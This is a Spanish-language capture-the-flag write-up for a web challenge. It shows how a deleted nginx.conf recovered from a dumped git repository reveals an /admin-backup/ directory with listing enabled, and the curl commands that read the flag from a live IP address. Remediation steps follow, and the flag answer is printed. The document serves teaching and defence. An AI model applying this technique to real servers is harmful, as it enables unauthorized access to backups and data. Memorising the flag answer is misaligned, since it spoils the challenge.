# Development 2

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 300 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `http://44.197.131.156:80` (mismo host que [Development](../development/README.md)) |
| **Descripción** | *"Buen ojo encontrando el git, pero aun queda algo"* |
| **Vulnerabilidad** | Directorio de backups expuesto con `autoindex` + configuración filtrada |
| **CWE** | CWE-548 (Exposure of Information Through Directory Listing), CWE-530 (Exposure of Backup File to an Unauthorized Control Sphere) |
| **OWASP** | A05:2021 – Security Misconfiguration |

## 1. Reconocimiento

Este reto continúa el anterior. Ya se tenía el repositorio dumpeado en `/tmp/dev_repo`. La descripción dice que "aún queda algo", así que había que revisar **todo** lo que el commit de limpieza borró, no solo `credentials.txt`.

## 2. Análisis

El commit `0d140fb` ("Limpiar archivos sensibles del repositorio") borró **dos** archivos:

```text
$ git log --all -p
...
diff --git a/nginx.conf b/nginx.conf
deleted file mode 100644
index 518bd53..0000000
--- a/nginx.conf
+++ /dev/null
@@ -1,18 +0,0 @@
-server {
-    listen 80;
-    server_name localhost;
-    root /usr/share/nginx/html;
-
-    location / {
-        index index.html;
-    }
-
-    location /.git/ {
-        autoindex on;
-    }
-
-    location /admin-backup/ {
-        alias /var/www/backups/;
-        autoindex on;
-    }
-}
```

El `nginx.conf` borrado revela una ruta que no está enlazada en el sitio:

```nginx
location /admin-backup/ {
    alias /var/www/backups/;   # publica la carpeta de backups del servidor
    autoindex on;              # con listado de directorio activado
}
```

Borrar el archivo del repo **no cambia la configuración del servidor**, así que la ruta probablemente sigue activa.

## 3. Explotación

Listado del directorio, gracias a `autoindex`:

```text
$ curl -s http://44.197.131.156/admin-backup/
<html>
<head><title>Index of /admin-backup/</title></head>
<body>
<h1>Index of /admin-backup/</h1><hr><pre><a href="../">../</a>
<a href="flag.txt">flag.txt</a>          20-Nov-2026 02:48          31
</pre><hr></body>
</html>
```

Lectura del archivo:

```text
$ curl -s http://44.197.131.156/admin-backup/flag.txt
AHAU{y0u_4r3_such_a_g00d_d3v}}
```

> **Nota:** son 31 bytes = 29 de la bandera + 1 `}` extra (typo del autor) + salto de línea. La bandera válida es `AHAU{y0u_4r3_such_a_g00d_d3v}`.

## 4. Causa raíz

- `alias /var/www/backups/` publica en la web una carpeta que **nunca** debería ser accesible por HTTP.
- `autoindex on` muestra el contenido del directorio. No hace falta adivinar nombres de archivo.
- El "fix" del desarrollador fue borrar `nginx.conf` del **repositorio**, pero el servidor sigue corriendo con esa configuración. Limpiar el repo no es lo mismo que limpiar el servidor.

## 5. Impacto

Todo lo que se guarde en `/var/www/backups/` (dumps de base de datos, copias de configuración, llaves) queda descargable por cualquiera sin autenticación.

## 6. Remediación

1. Eliminar la `location /admin-backup/` de la configuración **real** del servidor y recargar nginx:

```bash
nginx -t && systemctl reload nginx
```

2. Desactivar `autoindex` de forma global:

```nginx
autoindex off;
```

3. Guardar los backups **fuera del webroot** y con permisos restrictivos (`chmod 600`, propietario root).
4. Si una ruta administrativa debe existir, protegerla con autenticación y una lista de IPs permitidas:

```nginx
location /admin-backup/ {
    allow 10.0.0.0/8;
    deny all;
    auth_basic "Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

## 🚩 Flag

```text
AHAU{y0u_4r3_such_a_g00d_d3v}
```

---
[⬅ Volver al índice](../../README.md)
